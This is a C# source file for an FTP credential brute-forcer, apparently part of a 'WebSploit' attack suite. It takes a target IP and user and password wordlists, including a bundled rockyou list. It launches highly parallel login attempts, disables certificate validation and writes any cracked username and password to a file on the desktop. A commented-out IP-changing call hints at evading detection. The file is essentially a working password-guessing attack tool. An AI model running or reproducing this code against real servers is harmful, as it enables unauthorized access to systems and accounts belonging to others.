/*
 *  FTP Server Credential Bruteforcer
 *
 *  Copyright (C) 2021 MishDotCom <mishdotcomdev@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
 *
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

using System;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.IO;

namespace FtpLogger
{
    class FtpAttacker
    {
        public static int main_counter = 0;
        public static bool env = false;
        public static int temp_counter = 0;
        public static bool written_sesion = false;

        public static void CommandInterpreter(string command)
        {
            string[] command_words = command.Split(" ");
            if(command_words.Length >= 2)
            {
                if(command_words[1] == "-help")
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[SYNTAX] > -ftpl <TARGET_IP_ADDRESS> <USER_LISTR>(type '-b' for built-in) <PASS_LIST>(type '-b' for built-in)");
                    Console.ForegroundColor = ConsoleColor.White;
                }
                else
                {
                    if(command_words.Length == 4)
                    {
                        if(IPAddress.TryParse(command_words[1], out IPAddress ipAddr))
                        {
                            string target_ip = command_words[1];
                            if(File.Exists(command_words[2]))
                            {
                                string[] users = File.ReadAllLines(command_words[2]);
                                if(File.Exists(command_words[3]))
                                {
                                    string[] pass = File.ReadAllLines(command_words[3]);
                                    FtpLogger.FtpAttacker.Attack(target_ip, users, pass);
                                }   
                                else if(command_words[3].ToLower() == "-b")
                                {
                                    string[] pass = WebSploit.Properties.Resources.rockyou.Split('\n');
                                    FtpLogger.FtpAttacker.Attack(target_ip, users, pass);
                                }
                                else
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine($"[!]-[websploit@ftpl] ~$ Invalid syntax [{command_words[3]}]!\n");
                                    Console.ForegroundColor = ConsoleColor.White;
                                }
                                
                            }
                            else if(command_words[2].ToLower() == "-b")
                            {
                                string[] users = WebSploit.Properties.Resources.users.Split('\n');
                                if(File.Exists(command_words[3]))
                                {
                                    string[] pass = File.ReadAllLines(command_words[3]);
                                    FtpLogger.FtpAttacker.Attack(target_ip, users, pass);
                                }   
                                else if(command_words[3].ToLower() == "-b")
                                {
                                    string[] pass = WebSploit.Properties.Resources.rockyou.Split('\n');
                                    FtpLogger.FtpAttacker.Attack(target_ip, users, pass);
                                }
                                else
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine($"[!]-[websploit@ftpl] ~$ Invalid syntax [{command_words[3]}]! Type '-ftplogger -help'\n");
                                    Console.ForegroundColor = ConsoleColor.White;
                                } 
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine($"[!]-[websploit@ftpl] ~$ Invalid syntax [{command_words[2]}]! Type '-ftplogger -help'\n");
                                Console.ForegroundColor = ConsoleColor.White;
                            }
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"[!]-[websploit@ftpl] ~$ Invalid ip address [{command_words[1]}]! Type '-ftplogger -help'\n");
                            Console.ForegroundColor = ConsoleColor.White;
                        }
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[!]-[websploit@ftpl] ~$ Invalid syntax [{command}]! Type '-ftplogger -help'\n");
                        Console.ForegroundColor = ConsoleColor.White;
                    }
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!]-[websploit@ftpl] ~$ Invalid syntax [{command}]! Type '-ftplogger -help'\n");
                Console.ForegroundColor = ConsoleColor.White;
            }
        }
        public static void Attack(string ip, string[] usrNames, string[] passwords)
        {
            SetupAttackEnv(ip);
            string final_ip = "ftp://" + ip + "/";
            int total = usrNames.Length * passwords.Length;
            ParallelOptions po = new ParallelOptions();
            po.MaxDegreeOfParallelism = Environment.ProcessorCount * 1000;
            Parallel.ForEach(usrNames, po,
            (usr, state1) =>
            {
                Parallel.ForEach(passwords, po,
                (pass, state2) =>
                {
                   
                    main_counter++;
                    temp_counter++;
                    if (temp_counter >= 50)
                    {
                        //IPChanger.ChangeIP();
                        temp_counter = 0;
                    }
                    FtpWebRequest ftpRequest = (FtpWebRequest)WebRequest.Create(new Uri(final_ip));
                    if (ftpRequest.EnableSsl)
                        ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(ValidateServerCertificate);
                    ftpRequest.KeepAlive = true;
                    ftpRequest.UsePassive = true;
                    ftpRequest.Timeout = -1;
                    ServicePointManager.Expect100Continue = false;
                    ServicePointManager.MaxServicePointIdleTime = 0;
                    ftpRequest.Credentials = new NetworkCredential(usr.Trim(), pass.Trim());
                    ftpRequest.Method = WebRequestMethods.Ftp.ListDirectory;
                    try
                    {
                        var response = (FtpWebResponse)ftpRequest.GetResponse();
                        if (response != null)
                        {
                            response.Close();
                        }
                        Console.WriteLine(response.StatusDescription + " " + response.StatusCode);
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[+]-[echo@ftpl] ~$ Login credentials found: usr {usr.Trim()} , pass {pass.Trim()}");
                        if (!written_sesion)
                            WriteSession(final_ip, pass, usr, main_counter, true);
                        Console.ReadLine();
                        Environment.Exit(1);
                        state1.Break();
                        state2.Break();
                    }
                    catch (WebException ex)
                    {
                        float percent1 = percent(main_counter, total);
                        Console.WriteLine($"[ATTEMPT] Invalid Credentials {usr.Trim()} : {pass.Trim()} || [{main_counter}/{total}] [{percent1}%]");
                        Console.WriteLine($"[VERBOSE] {ex.Message}");
                    }
                });
            });
            WriteSession(final_ip, "", "", main_counter, false);
        }
        static float percent(int current, int total)
        {
            float x = ((float)current / (float)total) * 100;
            return x;
        }

        public static void WriteSession(string target, string passKey, string usr, int trys, bool result)
        {
            if (result == true)
            {
                Random seed = new Random();
                string fileName = "FtpLoggerSession" + seed.Next(10000, 99999);
                string writableText = $"[FtpLogger Session Results]\n" +
                                        $"Target : {target}\n" +
                                        $"Username : {usr}\n" +
                                        $"Passkey : {passKey}\n" +
                                        $"Found in {trys} trys.";
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "/" + fileName + ".txt";
                if (!File.Exists(path))
                {
                    string directoryName = Path.GetDirectoryName(path);
                    Directory.CreateDirectory(directoryName);
                    using (StreamWriter sw = File.CreateText(path))
                    {
                        sw.Write(writableText);
                    }
                    Console.WriteLine($">> Session result saved to path : {path}");
                    written_sesion = true;
                }
                else
                {
                    Console.WriteLine(">> File alredy exists.(For some reason)");
                    WriteSession(target, passKey, usr, trys, result);
                }
            }
            else
            {
                Random seed = new Random();
                string fileName = "FtpLoggerSession" + seed.Next(10000, 99999);
                string writableText = $"[FtpLogger Session Results]\n" +
                                        $"Target : {target}\n" +
                                        $"Passkey : NOT FOUND\n" +
                                        $"Total of {trys} trys.";
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "/" + fileName + ".txt";
                if (!File.Exists(path))
                {
                    string directoryName = Path.GetDirectoryName(path);
                    Directory.CreateDirectory(directoryName);
                    using (StreamWriter sw = File.CreateText(path))
                    {
                        sw.Write(writableText);
                    }
                    Console.WriteLine($">> Session result saved to path : {path}");
                    written_sesion = true;
                }
                else
                {
                    Console.WriteLine("File alredy exists.(For some reason)");
                    WriteSession(target, passKey, usr, trys, result);
                }
            }
        }

        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true; 
        }

        static void SetupAttackEnv(string ip)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(Figgle.FiggleFonts.Standard.Render("Ftp Logger"));
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Ftp Logger v1.1 © 2021 MishDotCom");
            Console.WriteLine("Part of the WebSploit suite.");
            Console.WriteLine("WebSploit > https://github.com/MishDotCom/WebSploit\n");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"Target ftp server : {ip}");
            Console.WriteLine("[INFO] : Begin bruteforce attack...\n");
            Console.ForegroundColor = ConsoleColor.White;
            Thread.Sleep(150);
        }
    } 
}